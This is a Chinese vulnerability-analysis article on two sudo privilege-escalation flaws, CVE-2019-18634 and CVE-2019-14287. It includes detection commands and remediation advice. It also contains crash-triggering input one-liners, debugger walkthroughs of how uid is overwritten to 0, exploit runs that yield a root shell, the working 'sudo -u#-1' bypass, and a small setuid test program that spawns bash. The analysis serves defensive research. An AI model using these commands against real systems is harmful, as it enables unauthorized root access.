> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [paper.seebug.org](https://paper.seebug.org/1129/)

**作者：Strawberry@ QAX A-TEAM  
原文链接：[https://mp.weixin.qq.com/s/wHwLh0mI00eyRHw8j3lTng](https://mp.weixin.qq.com/s/wHwLh0mI00eyRHw8j3lTng)**

sudo 的全称是 “superuserdo”，它是 Linux 系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令，通常是以 root 用户身份运行命令，以减少 root 用户的登录和管理时间，同时提高安全性。

sudo 的存在可以使用户以 root 权限执行命令而不必知道 root 用户的密码，还可以通过策略给予用户部分权限。但 sudo 中如果出现漏洞，可能会使获取部分权限或没有 sudo 权限的用户提升至 root 权限。近日，苹果公司的研究员 Joe Vennix 在 sudo 中再次发现了一个重要漏洞，可导致低权限用户或恶意程序以管理员（根）权限在 Linux 或 macOS 系统上执行任意命令。奇安信 CERT 漏洞监测平台显示，该漏洞热度从 2 月 4 号起迅速上升，占据 2 月第一周漏洞热度排行榜第一位。sudo 在去年 10 月份被曝出的漏洞也是由 Vennix 发现的，该漏洞为 sudo 安全策略绕过漏洞，可导致恶意用户或程序在目标 Linux 系统上以 root 身份执行命令。该漏洞在去年 10 月份的热度也很高。然后再早一些就是 17 年 5 月 30 日曝出的 sudo 本地提权漏洞，本地攻击者可利用该漏洞覆盖文件系统上的任何文件，从而获取 root 权限。下面来回顾一下这些漏洞：

<table><thead><tr><th>漏洞编号</th><th>漏洞危害</th><th>漏洞类型</th><th>POC 公开</th><th>需要密码</th><th>常规配置</th><th>利用难度</th></tr></thead><tbody><tr><td>CVE-2019-18634</td><td>权限提升</td><td>缓冲区溢出</td><td>是</td><td>否</td><td>否</td><td>低</td></tr><tr><td>CVE-2019-14287</td><td>权限提升</td><td>策略绕过</td><td>是</td><td>是</td><td>否</td><td>中</td></tr><tr><td>CVE-2017-100036</td><td>任意文件读写 &amp;&amp; 权限提升</td><td>逻辑缺陷</td><td>是</td><td>是</td><td>是</td><td>中</td></tr></tbody></table>

漏洞简讯
----

近日，苹果公司的研究员 Joe Vennix 在 sudo 中再次发现了一个重要漏洞，该漏洞依赖于某种特定配置，可导致低权限用户或恶意程序以管理员（根）权限在 Linux 或 macOS 系统上执行任意命令。

Vennix 指出，只有 sudoers 配置文件中设置了 “pwfeedback” 选项时，才能利用该漏洞；当用户在终端输入密码时， pwfeedback 功能会给出一个可视的反馈即星号 (*)。

需要注意的是，pwfeedback 功能在 sudo 或很多其它包的上游版本中并非默认启用。然而，某些 Linux 发行版本，如 Linux Mint 和 Elementary OS， 在 sudoers 文件中默认启用了该功能。

此外，当启用 pwfeedback 功能时，任何用户都可利用该漏洞，无 sudo 许可的用户也不例外。

影响范围
----

Linux Mint 和 Elementary OS 系统以及其它 Linux、macOS 系统下配置了 pwfeedback 选项的以下 sudo 版本受此漏洞影响：

1.7.1 <= sudo version < 1.8.31

需要注意的是，该漏洞影响 sudo 1.8.31 之前版本，但由于从 sudo 1.8.26 版本开始引入了 EOF 处理，sudo_term_eof 和 sudo_term_kill 都被初始化为 0，sudo_term_eof 总是先被处理，因而使用‘\x00’字符不再会进入漏洞流程。但使用 pty 时，sudo_term_eof 和 sudo_term_kill 分别被初始化为 0x4 和 0x15，因而可使用 pty 在这些版本上进行利用。用户可升级至最新版本 1.8.31。

检测方法
----

1、查看 sudo 是否配置了 pwfeedback 选项，如果输出中出现 “pwfeedback” 则代表配置了该选项，需要在 / etc/sudoers 中找到它并删除：

```
strawberry@ubuntu:~$ sudo -l
Matching Defaults entries for strawberry on ubuntu:
    env_reset, pwfeedback, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User strawberry may run the following commands on ubuntu:
    (ALL : ALL) ALL


```

2、低于 1.8.26 版本的 sudo 也可以通过以下命令进行检测，如果出现 Segmentation fault 就代表存在漏洞：

```
strawberry@ubuntu:~$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
[sudo] password for strawberry: Segmentation fault (core dumped)


```

3、低于 1.8.31 版本的 sudo 也可通过以下命令进行检测：

```
strawberry@ubuntu:~$ socat pty,link=/tmp/pty,waitslave exec:"perl -e 'print((\"A\" x 100 . chr(0x15)) x 50)'" &
[4] 82553
strawberry@ubuntu:~$ sudo -S id < /tmp/pty
[sudo] password for strawberry: Segmentation fault (core dumped)


```

漏洞分析
----

首先说一下，这是在 Ubuntu 上进行复现分析的，sudo 版本为 1.8.21p1。pwfeedback 不是 sudo 的默认配置，因而需要向 / etc/sudoers 文件中加入 pwfeedback，开启此功能的 sudo 在用户输入密码时会逐位显示 * 号：

```
Defaults        env_reset,pwfeedback


```

使用上面的第一个 POC 对 sudo 进行调试分析：直接运行程序，发现其崩在 getln 函数内部，原因是无法访问 0x560a0de9c000 处的内存。这里的 cp 是指向 buf 的指针，通过 * cp++ 向该缓冲区中写入数据。此时 buf 的长度为 3392，显然是在写入数据的过程中访问了无法访问的内存而崩溃的。另外，buf 位于 bss 段（大小为 0x100），所以也不是传说中的栈溢出。

```
→  0x560a0dc90298 <getln.constprop+376> mov    BYTE PTR [r15], dl
   0x560a0dc9029b <getln.constprop+379> add    r15, 0x1
   0x560a0dc9029f <getln.constprop+383> mov    QWORD PTR [rsp+0x8], r14
   0x560a0dc902a4 <getln.constprop+388> sub    r14, 0x1
   0x560a0dc902a8 <getln.constprop+392> test   r14, r14
   0x560a0dc902ab <getln.constprop+395> jne    0x560a0dc90188 <getln+104>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:./tgetpass.c+334 ────
    329         }
    330         continue;
    331         }
    332         ignore_result(write(fd, "*", 1));
    333     }
 →  334     *cp++ = c;
    335      }
    336      *cp = '\0';
    337      if (feedback) {
    338     /* erase stars */
    339     while (cp > buf) {
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sudo", stopped 0x560a0dc90298 in getln (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x560a0dc90298 → getln(fd=0x0, buf=0x560a0de9b2c0 <buf> 'A' <repeats 3392 times><


```

下面我们来看一下，为什么可以向 buf 中复制超出边界的数据。有一个要点是只有开启了 pwfeedback 选项的程序才会存在此漏洞，还有就是 POC 中每 100 个 A 后面跟一个 \ x00。来~ 上前面代码：

```
static char * getln(int fd, char *buf, size_t bufsiz, int feedback)
{
    size_t left = bufsiz;
    ssize_t nr = -1;
    char *cp = buf;
    char c = '\0';
    debug_decl(getln, SUDO_DEBUG_CONV)

    if (left == 0) {
    errno = EINVAL;
    debug_return_str(NULL);     /* sanity */
    }

    while (--left) {
    nr = read(fd, &c, 1);
    if (nr != 1 || c == '\n' || c == '\r')
        break;
    if (feedback) {
        if (c == sudo_term_kill) {
        while (cp > buf) {
            if (write(fd, "\b \b", 3) == -1)
            break;
            --cp;
        }
        left = bufsiz;
        continue;
        } else if (c == sudo_term_erase) {
        if (cp > buf) {
            if (write(fd, "\b \b", 3) == -1)
            break;
            --cp;
            left++;
        }
        continue;
        }
        ignore_result(write(fd, "*", 1));
    }
    *cp++ = c;
    }
...


```

if 语句中的 feedback 和 pwfeedback 选项是否开启相关，假设没有开启，会依次从用户输入中读取一个字节 c，然后执行 * cp++ = c，cp 指向了 buf，这样就会将用户输入的密码依次写入 buf，由于 left 控制循环次数，left 为 bufsiz，大小为 0x100（如下所示），所以最多只能复制 0xFF 字节（最后一位为 \ x00），因此未开启 pwfeedback 选项的程序不会溢出。

```
text:000000000001EEEC                 mov     eax, [rbp+input]
text:000000000001EEF2                 mov     ecx, edx        ; feedback
text:000000000001EEF4                 mov     edx, 100h       ; bufsiz
text:000000000001EEF9                 lea     rsi, buf_5295   ; buf
text:000000000001EF00                 mov     edi, eax        ; fd
text:000000000001EF02                 call    getln


```

注意到 sudo_term_kill 这个条件判断，如果程序开启了 pwfeedback 选项，会先比较读入的 c 是否等于 sudo_term_kill，经过调试可知这个值为 0。所以 POC 中每 100 个 A 后面跟的 \ x00 作用就在这里了，可以使程序进入这个流程，由于 fd 为单向管道，所以 write(fd, "\b \b", 3) 总是返回 - 1，这样就会直接跳出循环，因而 cp 还是指向之前的地方。紧接着执行重要的两句是 left = bufsiz 和 continue，可以将 left 重新置为 0x100，然后跳出本次循环。因而只要在小于 0xFF 的数据之间连接 \ x00 就可以不断向 buf 中写入数据，超出 buf 范围，直到访问到不可读内存触发异常。

```
    if (feedback) {
        if (c == sudo_term_kill) {
        while (cp > buf) {
            if (write(fd, "\b \b", 3) == -1)
            break;
            --cp;
        }
        left = bufsiz;
        continue;
        }


```

1.8.26 至 1.8.30 版本的 sudo 加入了 sudo_term_eof 的条件判断，如果读取的字符为 \ x00 就结束循环，这使得 \ x00 这个桥梁不再起作用。

```
    if (feedback) {
        if (c == sudo_term_eof) {
        nr = 0;
        break;
        } else if (c == sudo_term_kill) {
        while (cp > buf) {
            if (write(fd, "\b \b", 3) == -1)
            break;
            --cp;
        }
        left = bufsiz;
        continue;
        }


```

但如果使用了 pty，sudo_term_eof 和 sudo_term_kill 分别被初始化为 0x4 和 0x15，这样 \ x15 又可以成为新的桥梁。

```
Breakpoint 1, getln (fd=0x0, buf=0x55a4f1d534e0 <buf> "", feedback=0x8, errval=0x7fff1c5b8acc, bufsiz=0x100) at ./tgetpass.c:376
376 getln(int fd, char *buf, size_t bufsiz, int feedback,
gef➤  p sudo_term_eof
$1 = 0x4
gef➤  p sudo_term_kill
$2 = 0x15
gef➤  p sudo_term_erase
$4 = 0x7f


```

下面是修补后的函数流程，这里最后将 cp 又重新指向 buf，这样又可以通过 bufsiz 控制循环了，\x15 的作用就只是重置本次密码读取了。

```
if (feedback) {
        if (c == sudo_term_eof) {
        nr = 0;
        break;
        } else if (c == sudo_term_kill) {
        while (cp > buf) {
            if (write(fd, "\b \b", 3) == -1)
            break;
            cp--;
        }
        cp = buf;
        left = bufsiz;
        continue;
        }


```

漏洞利用
----

1、user_details 覆盖

前面分析的时候可知，buf 位于 bss 段，其后面存在以下数据结构：

```
buffer              256
askpass             32
signo               260 
tgetpass_flags      28
user_details        104


```

其中，user_details 位于 buf 偏移 0x240 处，其偏移 0x14 处为用户的 uid（这里为 0x3e8，十进制为 1000，即用户 strawberry 的 id）：

```
gef➤  x/26wx &user_details
0x562eb2410500 <user_details>:  0x00015c5e  0x00015c57  0x00015c5e  0x00015c5e
0x562eb2410510 <user_details+16>:   0x00015c4a  0x000003e8  0x00000000  0x000003e8
0x562eb2410520 <user_details+32>:   0x000003e8  0x00000000  0xb3f39605  0x0000562e
0x562eb2410530 <user_details+48>:   0xb3f39894  0x0000562e  0xb3f398d4  0x0000562e
0x562eb2410540 <user_details+64>:   0xb3f39945  0x0000562e  0xb3f39620  0x0000562e
0x562eb2410550 <user_details+80>:   0xb3f397d0  0x0000562e  0x00000008  0x0000009f
0x562eb2410560 <user_details+96>:   0x00000033  0x00000000

gef➤  p user_details
$3 = {
  pid = 0x15c5e, 
  ppid = 0x15c57, 
  pgid = 0x15c5e, 
  tcpgid = 0x15c5e, 
  sid = 0x15c4a, 
  uid = 0x3e8, 
  euid = 0x0, 
  gid = 0x3e8, 
  egid = 0x3e8, 
  username = 0x562eb3f39605 "strawberry", 
  cwd = 0x562eb3f39894 "/home/strawberry/Desktop/sudo-SUDO_1_8_21p1/build2", 
  tty = 0x562eb3f398d4 "/dev/pts/2", 
  host = 0x562eb3f39945 "ubuntu", 
  shell = 0x562eb3f39620 "/bin/bash", 
  groups = 0x562eb3f397d0, 
  ngroups = 0x8, 
  ts_cols = 0x9f, 
  ts_lines = 0x33
}


```

测试：在 sudo 运行的过程中将 uid 的值改为 0，那用户就可以获取 root 权限。因而我们需要想办法利用溢出将其 uid 覆盖为 0。

```
Hardware access (read/write) watchpoint 2: *0x56234e1d5514
Old value = 0x0
New value = 0x3e8
get_user_info (ud=0x56234e1d5500 <user_details>) at ./sudo.c:517
517     ud->euid = geteuid();
gef➤  set ud->uid = 0
gef➤  c
Continuing.
process 89879 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),1000(strawberry)


```

如果想通过 buf 将数据覆盖到 user_details，中间必须经过 signo。而在 getln 函数执行完成后会返回到 tgetpass 函数中，如果 signo 结构中的某些值不为 0，那程序就存在被 kill 掉的风险。如果采用第一种验证思路，使用 “\x00” 作为桥梁，就不可能将 0 写入 signo 结构中，更不能将 uid 覆盖为 0，我和我的小伙伴们就在这里卡住了。

```
    for (i = 0; i < NSIG; i++) {
    if (signo[i]) {
        switch (i) {
        case SIGALRM:
            break;
        case SIGTSTP:
        case SIGTTIN:
        case SIGTTOU:
            if (suspend(i, callback) == 0)
            need_restart = true;
            break;
        default:
            kill(getpid(), i);
            break;
        }
    }
    }


```

幸运的是，第二天看到了关于漏洞的补充说明 [https://www.openwall.com/lists/oss-security/2020/02/05/2](https://www.openwall.com/lists/oss-security/2020/02/05/2). 然而，这调试有点难度，调试的时候在读取密码上总是返回 0。不过，只是想覆盖 user_details 而已，我可以使用 “\x15” 作为桥梁向 sudo 输送 5000 个 0 嘛（偷个懒），程序肯定收到 SIGSEGV 信号，这时候再看 uid 是否被覆盖就可以了。uid 被成功覆盖为 0。

```
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sudo", stopped 0x563f1d558298 in getln (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────
getln (fd=fd@entry=0x0, buf=buf@entry=0x563f1d7632c0 <buf> "", feedback=feedback@entry=0x8, bufsiz=0x100) at ./tgetpass.c:334
334     *cp++ = c;
gef➤  p user_details 
$1 = {
  pid = 0x0, 
  ppid = 0x0, 
  pgid = 0x0, 
  tcpgid = 0x0, 
  sid = 0x0, 
  uid = 0x0, 
  euid = 0x0, 
  gid = 0x0, 
  egid = 0x0, 
  username = 0x0, 
  cwd = 0x0, 
  tty = 0x0, 
  host = 0x0, 
  shell = 0x0, 
  groups = 0x0, 
  ngroups = 0x0, 
  ts_cols = 0x0, 
  ts_lines = 0x0
}


```

2、SUDO_ASKPASS 设置

然后把数据量变小，使其可以覆盖到 user_details，又不会使程序崩溃。出现了如下结果，提示没有指定输入方式，第一次使用了标准输入，当 sudo 检查密码错了之后会提示再次输入，正常情况下是不会有问题的，可能是因为刚才将某个值覆盖为 0 了：

```
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_21p1/build2/bin$ ./sudo -S id < /tmp/pty
Password: 
Sorry, try again.
sudo: no tty present and no askpass program specified
sudo: 1 incorrect password attempt


```

这篇文章:[https://dylankatz.com/Analysis-of-CVE-2019-18634/](https://dylankatz.com/Analysis-of-CVE-2019-18634/) 中提到了 SUDO_ASKPASS 的使用，很妙~>) 中提到了 SUDO_ASKPASS 的使用，很妙~ 首先使用 pty 设置密码，通过溢出将 uid 设置为 0，并且将密码读取方式改为 ASKPASS。这样在后面的循环中就会使用指定的 SUDO_ASKPASS 程序，并将其 uid 设置为 0。当然，ASKPASS 环境变量是提前设置好的。关键的一点是要将我之前设置为 0 的 tgetpass_flags 设置为 4。最后简单提一下 SUDO_ASKPASS 程序里的内容，最关键的就是 set uid 并执行 shell 了。这样执行 SUDO_ASKPASS 程序就可以获取 root shell。

```
/*
 * Flags for tgetpass()
 */
#define TGP_NOECHO  0x00        /* turn echo off reading pw (default) */
#define TGP_ECHO    0x01        /* leave echo on when reading passwd */
#define TGP_STDIN   0x02        /* read from stdin, not /dev/tty */
#define TGP_ASKPASS 0x04        /* read from askpass helper program */
#define TGP_MASK    0x08        /* mask user input when reading */
#define TGP_NOECHO_TRY  0x10    /* turn off echo if possible */


```

科普：上面是 tgetpass 各个 flag 的宏定义，其中 ASKPASS 值为 4，STDIN 值为 2，分别对应了 -A 和 -S 选项。

```
 →  507      if (ISSET(tgetpass_flags, TGP_STDIN) && ISSET(tgetpass_flags, TGP_ASKPASS)) {
    508         sudo_warnx(U_("the `-A' and `-S' options may not be used together"));
    509         usage(1);
    510      }


```

3、漏洞复现

使用有 sudo 权限的用户进行测试，成功获取 root 权限。

```
strawberry@ubuntu:~/Desktop$ sh exp_test.sh 
[sudo] password for strawberry: 
Sorry, try again.
Sorry, try again.
sudo: 2 incorrect password attempts
Exploiting!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@ubuntu:/home/strawberry/Desktop# id
uid=0(root) gid=1000(strawberry) groups=1000(strawberry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)


```

使用没有 sudo 权限的 testtest 用户进行测试，成功获取 root 权限。

```
testtest@ubuntu:~$ sh exp_test.sh 
[sudo] password for testtest: 
Sorry, try again.
Sorry, try again.
sudo: 2 incorrect password attempts
Exploiting!
root@ubuntu:/home/testtest# id
uid=0(root) gid=1001(testtest) groups=1001(testtest)


```

漏洞总结
----

当 sudo 配置了 “pwfeedback” 选项时，如果用户通过管道等方式传入密码，sudo 会在一定范围内判断密码中是否存在 sudo_term_kill，如果存在，则重置复制长度，但指向缓冲区的指针没有归到原位，用户可发送带有 sudo_term_kill 字符的超长密码来触发此缓冲区溢出漏洞。攻击者可利用特制的超长密码覆盖位于密码存储缓冲区后面的 user_details 结构，从而获取 root 权限。

**参考文章**

1.  [https://www.openwall.com/lists/oss-security/2020/01/30/6](https://www.openwall.com/lists/oss-security/2020/01/30/6)
    
2.  [https://securityaffairs.co/wordpress/97265/breaking-news/sudo-cve-2019-18634-flaw.html](https://securityaffairs.co/wordpress/97265/breaking-news/sudo-cve-2019-18634-flaw.html)
    
3.  [https://mp.weixin.qq.com/s/QUyh3mSuw1aZ4CVjx7Lzfw](https://mp.weixin.qq.com/s/QUyh3mSuw1aZ4CVjx7Lzfw)
    
4.  [https://www.sudo.ws/alerts/pwfeedback.html](https://www.sudo.ws/alerts/pwfeedback.html)
    
5.  [https://dylankatz.com/Analysis-of-CVE-2019-18634/](https://dylankatz.com/Analysis-of-CVE-2019-18634/)
    

漏洞简讯
----

2019 年 10 月 14 日，sudo 曝出权限绕过漏洞，漏洞编号为 CVE-2019-14287。该漏洞也是由苹果公司的研究员 Joe Vennix 发现的，可导致恶意用户或程序在目标 Linux 系统上以 root 身份执行命令。不过此漏洞仅影响 sudo 的特定非默认配置，典型的配置如下所示：

someuser myhost =（ALL, !root）/usr/bin/somecommand

此配置允许用户 “someuser” 以除 root 外的任何其他用户身份运行 somecommand。“someuser”可使用 ID 来指定目标用户，并以该用户的身份来运行指定命令。但由于漏洞的存在，“someuser”可指定 ID 为 - 1 或 4294967295，从而以 root 用户身份来运行 somecommand。以这种方式运行的命令的日志项将目标用户记录为 4294967295，而不是 root。此外，在这个过程中，PAM 会话模块将不会运行。

另外，sudo 的其他配置，如允许用户以任何用户身份运行命令的配置（包括 root 用户），或允许用户以特定其他用户身份运行命令的配置均不受此漏洞影响。

影响范围
----

1.8.28 版本之前且具有特定配置的 sudo 受此漏洞影响

检测方法
----

检查 / etc/sudoers 文件中是否存在以下几种配置，如果存在建议删除该配置或升级到 1.8.28 及之后版本：

```
1. someuser ALL=(ALL, !root) /usr/bin/somecommand
2. someuser ALL=(ALL, !#0) /usr/bin/somecommand
3. Runas_Alias MYGROUP = root, adminuser
   someuser ALL=(ALL, !MYGROUP) /usr/bin/somecommand


```

漏洞复现
----

这个漏洞复现比较简单，所以先复现再分析吧~ 首先要配置漏洞环境来进行测试，在此之前添加一个测试账户 testtest，另外，sudo 版本依然为 1.8.21p1。然后在 / etc/sudoers 文件中加入 testtest ALL=(ALL, !root) /usr/bin/id，这样允许 testtest 用户可以以除了 root 用户之外的任意用户的身份来运行 id 命令。

正常情况下，testtest 用户可以直接执行 id 命令，也可以用其它用户身份（除 root 外）执行 id 命令。

```
testtest@ubuntu:/home/strawberry$ id
uid=1001(testtest) gid=1001(testtest) groups=1001(testtest)
testtest@ubuntu:/home/strawberry$ sudo -u#1111 id
[sudo] password for testtest:       
uid=1111 gid=1001(testtest) groups=1001(testtest)

testtest@ubuntu:/home/strawberry$ sudo -u root id
Sorry, user testtest is not allowed to execute '/usr/bin/id' as root on ubuntu.
testtest@ubuntu:/home/strawberry$ sudo -u#0 id
Sorry, user testtest is not allowed to execute '/usr/bin/id' as root on ubuntu.


```

而如果 testtest 用户指定以 ID 为 - 1 或 4294967295 的用户来运行 id 命令，则会以 root 权限来运行。这是因为 sudo 命令本身就已经以用户 ID 为 0 运行，因此当 sudo 试图将用户 ID 修改成 -1 时，不会发生任何变化。并且 sudo 日志条目将该命令报告为以用户 ID 为 4294967295 而非 root 运行命令。此外，由于通过–u 选项指定的用户 ID 并不存在于密码数据库中，因此不会运行任何 PAM 会话模块。

```
testtest@ubuntu:/home/strawberry$ sudo -u#-1 id
uid=0(root) gid=1001(testtest) groups=1001(testtest)
testtest@ubuntu:/home/strawberry$ sudo -u#4294967295 id
uid=0(root) gid=1001(testtest) groups=1001(testtest)


```

另外，如果文件中配置了 testtest ALL=(ALL, !root) /usr/bin/vi 这种语句，可能使该用户获取使用机密文件的权限，如 / etc/shadow。如果配置了 testtest ALL=(ALL, !root)ALL，testtest 用户将会获得 root 权限（这种配置应该很少出现的吧）：

```
testtest@ubuntu:/home/strawberry$ sudo -u#-1 sh
[sudo] password for testtest:       
# id
uid=0(root) gid=1001(testtest) groups=1001(testtest)
# cat /etc/shadow 
root:!:18283:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
...


```

漏洞分析
----

从漏洞补丁 [https://github.com/sudo-project/sudo/commit/f752ae5cee163253730ff7cdf293e34a91aa5520](https://github.com/sudo-project/sudo/commit/f752ae5cee163253730ff7cdf293e34a91aa5520) 关于 - 1 的处理改动，下面这两段代码位于 lib/util/strtoid.c 中的 sudo_strtoid_v1 函数（分别为处理 64 位和 32 位的两个函数），补丁加入了对 -1 和 UINT_MAX（4294967295）的判断，如果不是才会放行。

![](https://images.seebug.org/content/images/2020/02/67ba7217-090c-4cba-a993-de98c8d81119.png-w331s)

64 位 sudo_strtoid_v1 函数

![](https://images.seebug.org/content/images/2020/02/13cd2115-e077-4f9a-ad06-5b3b965bf223.jpg-w331s)

32 位 sudo_strtoid_v1 函数

在 command_info_to_details 中，通过调用 sudo_strtoid_v1 函数获取用户指定 id，并存入 details->uid 中。

```
    743         if (strncmp("runas_uid=", info[i], sizeof("runas_uid=") - 1) == 0) {
    744             cp = info[i] + sizeof("runas_uid=") - 1;
    745             id = sudo_strtoid(cp, NULL, NULL, &errstr);
    746             if (errstr != NULL)
    747             sudo_fatalx(U_("%s: %s"), info[i], U_(errstr));
    748             details->uid = (uid_t)id;
               // details=0x00007fff2110e4e0  →  [...]  →  0x00000000ffffffff
 →  749             SET(details->flags, CD_SET_UID);
    750             break;
    751         }
    752  #ifdef HAVE_PRIV_SET
    753         if (strncmp("runas_privs=", info[i], sizeof("runas_privs=") - 1) == 0) {
    754                      const char *endp;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sudo", stopped 0x564bb9b02e61 in command_info_to_details (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x564bb9b02e61 → command_info_to_details(info=0x564bba8aaba0, details=0x564bb9d140c0 <command_details>)
[#1] 0x564bb9b00653 → main(argc=0x3, argv=0x7fff2110e7d8, envp=0x7fff2110e7f8)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
749             SET(details->flags, CD_SET_UID);
1: *details = {
  uid = 0xffffffff, 
  euid = 0x0, 
  gid = 0x0, 
  egid = 0x0,


```

然后使用 details->uid 赋值 details->euid，此时结构中的 uid 和 euid 均为 0xffffffff。

```
    808      if (!ISSET(details->flags, CD_SET_EUID))
    809     details->euid = details->uid;
             // details=0x00007fff2110e4e0  →  [...]  →  0xffffffffffffffff
 →  810      if (!ISSET(details->flags, CD_SET_EGID))
    811     details->egid = details->gid;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sudo", stopped 0x564bb9b03741 in command_info_to_details (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x564bb9b03741 → command_info_to_details(info=0x564bba8aaba0, details=0x564bb9d140c0 <command_details>)
[#1] 0x564bb9b00653 → main(argc=0x3, argv=0x7fff2110e7d8, envp=0x7fff2110e7f8)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
810     if (!ISSET(details->flags, CD_SET_EGID))
1: *details = {
  uid = 0xffffffff, 
  euid = 0xffffffff, 
  ...


```

调试发现，在 main 函数中，程序先使用 setuid(ROOT_UID) 将 uid 设置为 0，然后执行 run_command(&command_details)，然后依次执行 sudo_execute -> exec_cmnd -> exec_setup。PS：这里的 command_details 就是 command_info_to_details 中保存的 details。

```
    286         if (ISSET(sudo_mode, MODE_BACKGROUND))
    287         SET(command_details.flags, CD_BACKGROUND);
    288         /* Become full root (not just setuid) so user cannot kill us. */
    289         if (setuid(ROOT_UID) == -1)
    290         sudo_warn("setuid(%d)", ROOT_UID);
 →  291         if (ISSET(command_details.flags, CD_SUDOEDIT)) {
    292         status = sudo_edit(&command_details);
    293         } else {
    294         status = run_command(&command_details);
    295         }
    296         /* The close method was called by sudo_edit/run_command. */
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sudo", stopped 0x55fb48d3d707 in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55fb48d3d707 → main(argc=0x3, argv=0x7ffdc681cd08, envp=0x7ffdc681cd28)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
291         if (ISSET(command_details.flags, CD_SUDOEDIT)) {
gef➤  p command_details
$3 = {
  uid = 0xffffffff, 
  euid = 0xffffffff, 
  gid = 0x3e8, 
  egid = 0x3e8, 
  ...


```

在 exec_setup 函数中存在如下语句，程序会使用 details 结构中的 uid 信息来设置 uid，在调试环境下使用的是 setresuid 函数（第一个），它可以设置用户的 uid、euid 和 suid，但如果某个参数为 - 1，就不会改变该参数对应的 id 值。然而 details->uid 和 details->euid 均为 - 1。

```
#if defined(HAVE_SETRESUID)
    if (setresuid(details->uid, details->euid, details->euid) != 0) {
    sudo_warn(U_("unable to change to runas uid (%u, %u)"),
        (unsigned int)details->uid, (unsigned int)details->euid);
    goto done;
    }
#elif defined(HAVE_SETREUID)
    if (setreuid(details->uid, details->euid) != 0) {
    sudo_warn(U_("unable to change to runas uid (%u, %u)"),
        (unsigned int)details->uid, (unsigned int)details->euid);
    goto done;
    }
#else
    /* Cannot support real user ID that is different from effective user ID. */
    if (setuid(details->euid) != 0) {
    sudo_warn(U_("unable to change to runas uid (%u, %u)"),
        (unsigned int)details->euid, (unsigned int)details->euid);
    goto done;


```

测试：编译如下测试程序，并赋予其与 sudo 相同的权限，以便模拟 sudo 程序中先执行 setuid(0)，然后再执行 setresuid(-1, -1, -1) 的场景。使用 testtest 用户运行该程序，成功获取 root 权限。PS：如果你设置的 id 为 1234 的话，程序就会执行 setresuid(0x4d2, 0x4d2, 0x4d2)，这样你的 uid 就被设置为 1234 了。

```
include <stdio.h>

int main() {
  setuid(0);
  setresuid(-1, -1, -1);
  execve("/bin/bash",NULL,NULL);
  return 0;
}


```

```
testtest@ubuntu:/home/strawberry/Desktop$ ./testid
root@ubuntu:/home/strawberry/Desktop# id
uid=0(root) gid=1001(testtest) groups=1001(testtest)
root@ubuntu:/home/strawberry/Desktop# cat /etc/shadow
root:!:18283:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
...


```

漏洞总结
----

sudo 在配置了类似于 testtest ALL=(ALL, !root) /usr/bin/id 语句后，存在一个权限绕过漏洞。程序首先会通过 setuid(0) 将 uid 设置为 0，然后执行 setresuid（id, id, id）将 uid 等设置为 id 的值，id 可为 testtest 用户指定的任意值。当 id 为 - 1（4294967295）时，setresuid 不改变 uid、euid 和 suid 中的任何一个，因而用户的 uid 还是为 0，可以达到权限提升的效果，但这一步在输入正确密码之后，因而攻击者还需获取账户密码，再加上这种配置，也是比较困难的。

另外，如果允许用户以任何用户身份运行命令（包括 root 用户），是不受此漏洞影响的，因为本来用户输了密码之后就可以以 root 身份运行命令吧。允许用户以特定其他用户身份运行命令也不受此漏洞影响，如下所示。

```
************ /etc/sudoers ***********
testtest ALL=(strawberry) /usr/bin/id

testtest@ubuntu:/home/strawberry/Desktop$ sudo -u strawberry id
[sudo] password for testtest:       
uid=1000(strawberry) gid=1000(strawberry) groups=1000(strawberry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
testtest@ubuntu:/home/strawberry/Desktop$ sudo -u#-1 id
Sorry, user testtest is not allowed to execute '/usr/bin/id' as #-1 on ubuntu.


```

**参考文章**

1.  [https://www.sudo.ws/alerts/minus_1_uid.html](https://www.sudo.ws/alerts/minus_1_uid.html)
    
2.  [https://access.redhat.com/security/cve/cve-2019-14287](https://access.redhat.com/security/cve/cve-2019-14287)
    
3.  [https://www.anquanke.com/post/id/189315](https://www.anquanke.com/post/id/189315)
    
